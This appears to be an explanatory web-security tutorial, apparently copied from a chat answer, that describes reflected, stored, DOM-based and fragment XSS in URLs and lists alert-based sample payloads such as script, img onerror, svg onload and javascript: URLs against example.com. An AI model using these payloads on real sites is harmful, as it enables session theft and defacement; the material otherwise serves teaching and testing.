Types of XSS in URLs
Reflected XSS in URL Parameters

The malicious script is included as part of the URL (often in a query string or fragment) and executed immediately when the URL is accessed.
Example:
php-template
Copy
http://example.com/search?q=<script>alert('XSS')</script>
In this case, if the website does not properly sanitize the q parameter, the script will be executed.
Stored XSS via URL Input

Malicious JavaScript is stored in the server's database (e.g., in a comment, profile, or feedback form) and then displayed in URLs when accessed later.
Example:
php-template
Copy
http://example.com/user/profile?name=<script>alert('XSS')</script>
DOM-based XSS in URL Handling

The script executes on the client side, manipulating the Document Object Model (DOM) based on unsanitized URL input. The page uses JavaScript to process the URL and update the page, allowing the attacker’s script to execute if input is not sanitized.
Example:
php-template
Copy
http://example.com/profile?username=<script>alert('XSS')</script>
If JavaScript code in the web application dynamically updates the page with the value of username without sanitizing it, it could execute the injected script.
XSS in URL Fragment Identifiers

Attackers can inject malicious JavaScript into the fragment part of the URL, which is not sent to the server but handled client-side (by JavaScript in the browser).
Example:
php-template
Copy
http://example.com/#<script>alert('XSS')</script>
If JavaScript on the page improperly handles the fragment and inserts it into the DOM, it could result in XSS.
Common XSS Payloads in URLs
Here are several example payloads that an attacker could use to exploit an XSS vulnerability in a URL:

Basic XSS Payloads:

<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
Payload for Reflected XSS:

php-template
Copy
http://example.com/search?q=<script>alert(document.cookie)</script>
This could steal cookies if the website does not sanitize the q parameter.

Payload with Image Injection:

bash
Copy
http://example.com/search?q=<img src="x" onerror="alert('XSS')">
Using the javascript: Protocol:

bash
Copy
http://example.com/redirect?url=javascript:alert('XSS')
SVG-Based XSS:

bash
Copy
http://example.com/?query=<svg/onload=alert('XSS')>
